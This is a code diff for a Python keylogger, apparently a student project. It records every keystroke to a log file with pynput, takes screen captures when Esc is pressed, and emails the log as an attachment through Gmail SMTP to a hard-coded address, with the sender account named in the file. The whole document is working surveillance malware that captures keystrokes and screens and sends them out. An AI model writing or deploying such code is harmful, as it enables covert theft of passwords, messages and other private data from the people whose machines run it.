@@ -1,14 +1,20 @@
+# Keylogger
+
+# Libraries
+import smtplib
+import ssl
 from email import encoders
 from email.mime.base import MIMEBase
-
-import pynput
-import smtplib, ssl
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
-from pynput.keyboard import Key, Listener
+from pynput import keyboard
+from pynput.keyboard import Listener
 import logging
+from PIL import ImageGrab
+from datetime import datetime
 
-#log_directory = ""
+
+log_directory = ""
 logging.basicConfig(filename="log_results.txt", level=logging.DEBUG)
 
 sender_email = "tnm031keylogger@gmail.com"
@@ -24,6 +30,12 @@ message["To"] = receiver_email
 message["Subject"] = subject
 
 message.attach(MIMEText(body, "plain"))
+
+
+def screenshot(image_name):
+    im = ImageGrab.grab()
+    im.save(image_name)
+
 
 with open(filename, "rb") as attachment:
     # Add file as application/octet-stream
@@ -41,12 +53,14 @@ with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
     server.login(sender_email, password)
     server.sendmail(sender_email, receiver_email, text)
 
-def keypress(key):
+
+def on_press(key):
     logging.info(str(key))
-    print(key);
+    print(key)
+    if key == keyboard.Key.esc:
+        screenshot(str(datetime.now().strftime("%Y-%m-%d %H:%M:%S")) + '.png')
 
-# Press the green button in the gutter to run the script.
+
 if __name__ == '__main__':
-    with Listener(on_press=keypress) as listener:
+    with Listener(on_press=on_press) as listener:
         listener.join()
-
